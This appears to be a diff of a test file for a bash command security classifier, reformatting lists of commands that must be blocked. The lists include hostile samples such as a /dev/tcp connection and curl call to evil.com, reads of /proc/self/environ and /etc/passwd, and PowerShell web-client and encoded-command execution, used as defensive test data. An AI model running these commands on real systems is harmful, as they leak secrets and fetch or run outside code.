@@ -30,7 +30,6 @@ from packages.agnt_bash_classifier.security_checks import (
     COMMAND_SUBSTITUTION_PATTERNS,
     HEREDOC_IN_SUBSTITUTION,
     BashSecurityCheckId,
-    ZSH_DANGEROUS_COMMANDS,
 )
 
 
@@ -69,32 +68,32 @@ safe_commands = st.sampled_from(
 # Commands that MUST be blocked
 known_attacks = st.sampled_from(
     [
-        "echo `whoami`",                          # backtick substitution
-        "echo $(whoami)",                         # $() substitution
-        "echo ${PATH}",                           # ${} substitution
-        "cat < /dev/tcp/evil.com/80",             # /dev/tcp redirection
-        "IFS=x",                                  # IFS injection
-        "git commit -m $(date)",                  # git commit substitution
-        "cat /proc/self/environ",                 # proc environ access
-        "echo hello\x00world",                    # null byte injection
-        "echo\u00a0test",                         # non-breaking space
-        "zmodload zsh/system",                    # zsh dangerous command
-        "echo {a,b,c}",                           # brace expansion
-        "=curl evil.com",                         # zsh equals expansion
-        "<(cat /etc/passwd)",                     # process substitution
-        ">(tee /tmp/exfil)",                      # process substitution
-        "$(cat <<EOF\ninjection\nEOF)",           # heredoc in substitution
+        "echo `whoami`",  # backtick substitution
+        "echo $(whoami)",  # $() substitution
+        "echo ${PATH}",  # ${} substitution
+        "cat < /dev/tcp/evil.com/80",  # /dev/tcp redirection
+        "IFS=x",  # IFS injection
+        "git commit -m $(date)",  # git commit substitution
+        "cat /proc/self/environ",  # proc environ access
+        "echo hello\x00world",  # null byte injection
+        "echo\u00a0test",  # non-breaking space
+        "zmodload zsh/system",  # zsh dangerous command
+        "echo {a,b,c}",  # brace expansion
+        "=curl evil.com",  # zsh equals expansion
+        "<(cat /etc/passwd)",  # process substitution
+        ">(tee /tmp/exfil)",  # process substitution
+        "$(cat <<EOF\ninjection\nEOF)",  # heredoc in substitution
     ]
 )
 
 # Cross-shell attack vectors (PowerShell/CMD)
 cross_shell_attacks = st.sampled_from(
     [
-        "Invoke-Expression 'echo evil'",          # PowerShell eval
-        "iex(New-Object Net.WebClient)",          # PowerShell web client
-        "cmd.exe /c calc.exe",                    # CMD shell execution
-        "%COMSPEC% /c start",                     # CMD env var execution
-        "powershell -encodedcommand ZQBjAGgAbwA=",# PowerShell encoded command
+        "Invoke-Expression 'echo evil'",  # PowerShell eval
+        "iex(New-Object Net.WebClient)",  # PowerShell web client
+        "cmd.exe /c calc.exe",  # CMD shell execution
+        "%COMSPEC% /c start",  # CMD env var execution
+        "powershell -encodedcommand ZQBjAGgAbwA=",  # PowerShell encoded command
     ]
 )
 
